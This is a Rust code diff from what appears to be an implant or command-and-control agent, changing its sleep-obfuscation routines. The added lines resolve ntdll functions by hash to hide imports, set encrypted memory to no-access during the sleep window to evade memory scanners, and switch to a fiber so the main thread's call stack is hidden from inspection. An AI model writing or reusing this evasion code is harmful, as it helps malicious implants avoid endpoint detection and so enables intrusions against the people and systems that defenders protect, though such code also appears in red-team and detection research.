@@ -39,7 +39,7 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
                 let duration_100ns = -(duration.as_nanos() as i64 / 100);
                 let delay = duration_100ns;
                 
-                let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_wstr(&"ntdll.dll\0".encode_utf16().collect::<Vec<u16>>()));
+                let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
                 let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(ntdll.unwrap_or(0), pe_resolve::hash_str(b"NtDelayExecution\0")).unwrap_or(0);
                 let addr = nt_delay_execution_addr as *const ();
                 if !addr.is_null() {
@@ -258,7 +258,8 @@ pub mod crypto {
                 libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_WRITE);
                 let slice = std::slice::from_raw_parts_mut(addr, size);
                 cipher.apply_keystream(slice);
-                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_EXEC);
+                // Encrypted: no permissions during sleep window (issue 5.1)
+                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_NONE);
             }
         }
     }
@@ -354,9 +355,10 @@ pub mod spoof {
             }
 
             log::debug!("spoof_stack: switching to sleep fiber (main thread stack hidden)");
-            // The actual sleep duration is set before calling spoof_stack; the
-            // fiber will sleep and then switch back. This function returns after
-            // the fiber has completed its sleep and switched back.
+            // Switch to the sleep fiber — the current thread's call stack is
+            // now hidden.  The sleep fiber will call Sleep() and then
+            // SwitchToFiber(main_fiber), which resumes execution right here.
+            SwitchToFiber(sleep_fiber);
         }
     }
 
